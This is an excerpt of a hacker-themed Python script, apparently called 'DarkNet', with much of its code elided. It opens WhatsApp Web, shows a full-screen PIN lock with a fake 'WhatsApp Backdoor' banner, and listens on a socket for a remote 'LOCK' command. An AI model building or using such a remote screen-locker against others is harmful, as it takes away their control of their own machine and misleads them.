...
def open_whatsapp():
    ...
    print("\n[DarkNet] 📱 Opening WhatsApp Web...")
    try:
        # Try Chrome first
        subprocess.Popen(['start', 'chrome', '--new-window', WHATSAPP_URL], shell=True)
    except:
        try:
            ...
            pass
    print("[DarkNet] ✅ WhatsApp Web opened!")
...
def hacker_animation(win):
    ...
    # WhatsApp indicator
    whatsapp_indicator = tk.Label(
        canvas,
        text="📱 WhatsApp Backdoor: ACTIVE & CONNECTED",
        fg="#00ff00", bg="black",
        font=("Courier", 10)
    )
    whatsapp_indicator.place(relx=0.5, rely=0.95, anchor="center")
    
    # Glitch effect
    glitch_effect(canvas, title)
    
    return entry, status, canvas
...
def lock_screen():
    ...
    entry, status, canvas = hacker_animation(win)
    ...
    def check():
        ...
        if entry.get() == UNLOCK_PIN:
            ...
            status.config(text="[!] ACCESS DENIED - INVALID KEY [!]")
...
def start_server():
    ...
    # Open WhatsApp when script starts
    open_whatsapp()
    ...
    try:
        ...
        print(f"[DarkNet] 📱 WhatsApp Web opened in browser")
        print("\n[DarkNet] 📡 Available commands:")
        print("   LOCK                    - Lock system with hacker mode")
            ...
            try:
                ...
                if data == "LOCK":
                    if is_locked:
                        ...
                        print("[HasnainDarkNet] ⚠ System already locked!")
                    else:
                        conn.send(b"LOCKING")
                        print("[DarkNet] 🔒 Locking system... [HACKER MODE ACTIVATED]")
                ...
                print(f"[HasnainDarkNet] ⚠ Error: {e}")
                try:
                    conn.close()
                except:
                    pass
